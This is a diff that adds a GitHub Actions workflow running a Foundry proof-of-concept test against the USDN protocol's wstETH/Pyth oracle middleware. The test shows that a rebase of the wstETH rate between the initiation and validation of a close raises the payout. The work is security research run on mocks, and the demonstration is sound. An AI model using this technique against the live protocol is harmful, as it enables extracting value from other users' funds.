@@ -1,0 +1,129 @@
+name: wstETH close payout timestamp-skew PoC
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [security/susdn-live-config]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+      - name: Run upstream protocol-level economic PoC
+        shell: bash
+        run: |
+          set -euo pipefail
+          git clone https://github.com/SmarDex-Ecosystem/usdn-contracts.git /tmp/usdn
+          cd /tmp/usdn
+          git checkout 0e6822448f574f836b1c18a1893eeba49293dac9
+          git config --global url."https://github.com/".insteadOf git@github.com:
+          forge soldeer install
+
+          cat > test/unit/UsdnProtocol/Actions/WstEthTimestampSkewEconomic.t.sol <<'SOL'
+          // SPDX-License-Identifier: UNLICENSED
+          pragma solidity 0.8.26;
+
+          import { UsdnProtocolBaseFixture } from "../utils/Fixtures.sol";
+          import { MockPyth } from "../../Middlewares/utils/MockPyth.sol";
+          import { MockChainlinkOnChain } from "../../Middlewares/utils/MockChainlinkOnChain.sol";
+          import { MOCK_PYTH_DATA } from "../../Middlewares/utils/Constants.sol";
+          import { WstEthOracleMiddlewareWithPyth } from "../../../../src/OracleMiddleware/WstEthOracleMiddlewareWithPyth.sol";
+
+          contract TestWstEthTimestampSkewEconomic is UsdnProtocolBaseFixture {
+              uint128 private constant POSITION_AMOUNT = 1 ether;
+
+              MockPyth private pyth;
+              MockChainlinkOnChain private chainlink;
+              WstEthOracleMiddlewareWithPyth private realOracle;
+              PositionId private posId;
+
+              function setUp() public {
+                  super._setUp(DEFAULT_PARAMS);
+
+                  // Create a normal validated long using the upstream protocol fixture.
+                  posId = setUpUserPositionInLong(
+                      OpenParams({
+                          user: address(this),
+                          untilAction: ProtocolAction.ValidateOpenPosition,
+                          positionSize: POSITION_AMOUNT,
+                          desiredLiqPrice: params.initialPrice - (params.initialPrice / 5),
+                          price: params.initialPrice
+                      })
+                  );
+
+                  // Replace only the protocol oracle with the production-class wstETH/Pyth middleware.
+                  // The underlying collateral token is the same WstETH instance already used by the protocol fixture.
+                  pyth = new MockPyth();
+                  chainlink = new MockChainlinkOnChain();
+                  realOracle = new WstEthOracleMiddlewareWithPyth(
+                      address(pyth), bytes32(0), address(chainlink), address(wstETH), 1 hours
+                  );
+
+                  vm.prank(managers.setExternalManager);
+                  protocol.setOracleMiddleware(realOracle);
+              }
+
+              function test_samePendingCloseSameHistoricalEthReportDifferentExecutionRateChangesPayout() public {
+                  uint256 rateBefore = wstETH.stEthPerToken();
+
+                  // Initiate with on-chain Chainlink so the pending close itself is identical and timestamp-coherent.
+                  protocol.initiateClosePosition(
+                      posId,
+                      POSITION_AMOUNT,
+                      DISABLE_MIN_PRICE,
+                      address(this),
+                      payable(address(this)),
+                      type(uint256).max,
+                      "",
+                      EMPTY_PREVIOUS_DATA,
+                      ""
+                  );
+
+                  skip(realOracle.getValidationDelay() + 1);
+
+                  uint256 fee = realOracle.validationCost(MOCK_PYTH_DATA, ProtocolAction.ValidateClosePosition);
+                  uint256 snap = vm.snapshotState();
+
+                  // Control: validate with the wstETH rate that existed when the pending action was created.
+                  uint256 balanceBefore = wstETH.balanceOf(address(this));
+                  LongActionOutcome controlOutcome = protocol.validateClosePosition{ value: fee }(
+                      payable(address(this)), MOCK_PYTH_DATA, EMPTY_PREVIOUS_DATA
+                  );
+                  uint256 payoutBefore = wstETH.balanceOf(address(this)) - balanceBefore;
+                  uint64 pythTimestampBefore = pyth.lastPublishTime();
+                  assertEq(uint8(controlOutcome), uint8(LongActionOutcome.Processed), "control close not processed");
+
+                  // Restore the *exact same* pending close and protocol state.
+                  assertTrue(vm.revertToState(snap), "snapshot revert failed");
+
+                  // Simulate only a +1 bp Lido rebase between historical ETH observation and validation execution.
+                  uint256 rateAfter = rateBefore + rateBefore / 10_000;
+                  vm.mockCall(address(wstETH), abi.encodeWithSignature("stEthPerToken()"), abi.encode(rateAfter));
+
+                  uint256 balanceBeforeSkew = wstETH.balanceOf(address(this));
+                  LongActionOutcome skewOutcome = protocol.validateClosePosition{ value: fee }(
+                      payable(address(this)), MOCK_PYTH_DATA, EMPTY_PREVIOUS_DATA
+                  );
+                  uint256 payoutAfter = wstETH.balanceOf(address(this)) - balanceBeforeSkew;
+                  uint64 pythTimestampAfter = pyth.lastPublishTime();
+                  assertEq(uint8(skewOutcome), uint8(LongActionOutcome.Processed), "skewed close not processed");
+
+                  // The Pyth ETH/USD report time is identical in both executions; only execution-time stEthPerToken differs.
+                  assertEq(pythTimestampAfter, pythTimestampBefore, "historical ETH report timestamp changed");
+                  assertGt(payoutAfter, payoutBefore, "execution-time wstETH rate did not increase user payout");
+
+                  emit log_named_uint("pyth_timestamp", pythTimestampBefore);
+                  emit log_named_uint("rate_before", rateBefore);
+                  emit log_named_uint("rate_after", rateAfter);
+                  emit log_named_uint("payout_before", payoutBefore);
+                  emit log_named_uint("payout_after", payoutAfter);
+                  emit log_named_uint("payout_delta", payoutAfter - payoutBefore);
+                  emit log_named_uint("payout_delta_bps_of_position", (payoutAfter - payoutBefore) * 10_000 / POSITION_AMOUNT);
+              }
+          }
+          SOL
+
+          forge test --match-contract TestWstEthTimestampSkewEconomic -vvvv
